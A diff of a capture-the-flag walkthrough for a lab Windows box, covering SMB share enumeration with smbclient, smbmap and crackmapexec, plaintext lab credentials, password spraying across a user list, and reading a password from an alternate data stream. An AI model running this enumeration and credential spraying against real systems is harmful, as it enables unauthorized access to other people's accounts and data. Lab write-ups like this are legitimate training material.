@@ -11,22 +11,57 @@
 
 ``telnet 10.10.10.178 4386``
 
-![image](https://user-images.githubusercontent.com/123066149/219978019-3bb70e9b-0f76-4ca8-8b82-0b4edb6179f5.png)
-
-
 HQK Reporting Service V1.2
 
 ![image](https://user-images.githubusercontent.com/123066149/219978012-ef2de3c1-ee16-4f12-a81d-e5d1c908e88e.png)
 
 # ${{\color{purple}Initial Foothold}}\ $
 
-smbclient -U 'guest%' -L //10.10.10.178  **:white_check_mark:**
+``smbclient -U 'guest%' -L //10.10.10.178``  **:white_check_mark:**
 
 ![nest](https://user-images.githubusercontent.com/123066149/219977952-10bf82e2-17dd-4847-9662-7c0574cb3f03.PNG)
 
-smbmap -u 'guest%' -p '' -H 10.10.10.178
+``smbmap -u 'guest%' -p '' -H 10.10.10.178``
 
 ![nest2](https://user-images.githubusercontent.com/123066149/219977955-11587394-53bb-4003-96db-4444483d1f9e.PNG)
+
+``tree -f``
+
+![nest6](https://user-images.githubusercontent.com/123066149/219978096-f7d14d29-972e-4762-bcc1-762285d76e56.PNG)
+
+### After a good enumeration I found a password in the share :
+
+![nest7](https://user-images.githubusercontent.com/123066149/219978134-ceda178d-80e0-486f-93b5-12f9d74e7f05.PNG)
+
+### The password was in vb format i used this site to decode it :
+
+https://dotnetfiddle.net/LdhDaa
+
+### See the difference in rights on the share:
+
+``crackmapexec smb 10.10.10.178 -u 'seazeaz' -p 'azeazeazee'`` 
+
+``crackmapexec smb 10.10.10.178 --shares -u 'TempUser' -p 'welcome2019'``
+
+``crackmapexec smb 10.10.10.178 --shares -u 'c.smith' -p 'xRxRxPANCAK3SxRxRx'``
+
+![image](https://user-images.githubusercontent.com/123066149/219978197-a0d102f9-3279-4ff7-a4e8-f5e79fe3eae2.png)
+
+### Replay the password for other users :
+
+``crackmapexec smb 10.10.10.178 -u users.lst -p welcome2019 --continue-on-success``
+
+![nest3](https://user-images.githubusercontent.com/123066149/219978170-7567d458-4be6-4c03-9a94-38b500e6ef36.PNG)
+
+### In a file named "Debug Mode Password.txté" I had to do a special command to find the password :
+
+``allinfo "Debug Mode Password.txt``
+
+``get "Debug Mode Password.txt":Password``
+
+``cat Debug Mode Password.txt``
+
+![nest4](https://user-images.githubusercontent.com/123066149/219978395-27c5720e-def1-46ee-8006-cfeb6154147d.PNG)
 
 
 # ${{\color{purple}Exploitation}}\ $ 
